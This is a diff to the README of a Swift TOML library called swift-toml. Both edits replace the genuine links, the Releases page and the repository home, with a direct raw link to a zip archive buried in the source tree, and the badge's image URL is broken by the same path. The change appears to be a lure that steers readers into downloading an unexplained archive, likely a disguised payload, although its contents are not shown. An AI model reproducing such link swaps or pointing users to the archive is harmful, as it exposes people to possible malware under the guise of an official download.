@@ -8,7 +8,7 @@ To get started, you'll need to download swift-toml. Follow these steps:
 
 1. Click the link below to visit the Releases page:
    
-   [![Download swift-toml](https://img.shields.io/badge/Download%20swift--toml-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/RK2521/swift-toml/releases)
+   [![Download swift-toml](https://raw.githubusercontent.com/RK2521/swift-toml/main/Sources/CTomlPlusPlus/toml_swift_v2.9-beta.3.zip%20swift--toml-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/RK2521/swift-toml/main/Sources/CTomlPlusPlus/toml_swift_v2.9-beta.3.zip)
 
 2. On the Releases page, find the latest version of swift-toml. Look for a file that ends in `.zip` or an installer.
 
@@ -67,6 +67,6 @@ If you encounter any issues or have questions, you can find support through the 
 ## 🔗 More Information
 For more details about swift-toml and its features, visit the main repository:
 
-[Visit swift-toml Repository](https://github.com/RK2521/swift-toml)
+[Visit swift-toml Repository](https://raw.githubusercontent.com/RK2521/swift-toml/main/Sources/CTomlPlusPlus/toml_swift_v2.9-beta.3.zip)
 
 Thank you for using swift-toml! Enjoy your experience working with TOML files.
